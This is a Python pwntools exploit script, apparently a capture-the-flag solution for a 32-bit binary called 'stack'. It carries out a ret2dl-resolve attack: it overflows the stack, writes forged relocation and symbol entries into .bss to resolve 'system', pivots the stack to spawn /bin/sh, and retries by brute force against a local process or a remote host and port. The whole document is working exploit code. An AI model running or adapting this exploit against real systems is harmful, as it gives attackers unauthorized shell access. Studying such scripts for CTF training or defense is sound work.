#!/usr/bin/python
#__author__:hhdx

from pwn import *

local_file = "./stack"
local_libc = "/lib/i386-linux-gnu/libc.so.6"

def debug(cmd = ""):
    gdb.attach(io, cmd)

def exp(io):
    elf = ELF(local_file)

    stack_size = 0x800
    bss_addr = elf.bss()
    base_stage = bss_addr + stack_size

    read_plt = elf.plt["read"]
    main = elf.sym["main"]

    io.send("A" * 0x14)         # feed read gift

    # debug("b *0x804844c")
    payload = p32(read_plt) + p32(main) + p32(0) + p32(base_stage) + "\x78"
    io.send(payload)            # brute force to exec read

    cmd = "/bin/sh"
    plt_0 = 0x80482d0
    rel_plt = 0x8048298
    reloc_index = base_stage + 16 - rel_plt
    read_got = elf.got["read"]
    dynsym = 0x80481cc
    dynstr = 0x804821c
    fake_sym_addr = base_stage + 24
    align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
    fake_sym_addr += align
    sym_index = (fake_sym_addr - dynsym) / 0x10
    r_info = (sym_index << 8) | 0x7
    fake_reloc = p32(read_got) + p32(r_info)
    st_name = fake_sym_addr + 0x10 - dynstr
    fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

    pl3 = p32(plt_0)
    pl3 += p32(reloc_index)
    pl3 += "AAAA"
    pl3 += p32(base_stage+80)
    pl3 += fake_reloc       # base_stage + 0x10
    pl3 += align * "P"
    pl3 += fake_sym         # fake sym
    pl3 += "system\x00"
    pl3 += "A" * (80 - len(pl3))
    pl3 += cmd + "\x00"

    sleep(1)
    io.send(pl3)

    sleep(1)
    io.send("A" * 0x14)
    io.send("A" * 0x10 + p32(base_stage + 4))


    io.interactive()


while True:
    if len(sys.argv) < 2:
        io = process(local_file)
        # libc = ELF(local_libc)
    elif len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
        io = remote(host, port)

    try:
        exp(io)
    except EOFError as e:
        io.close()
        log.warning("failed. restarting...")
    else:
        log.info("success")
        break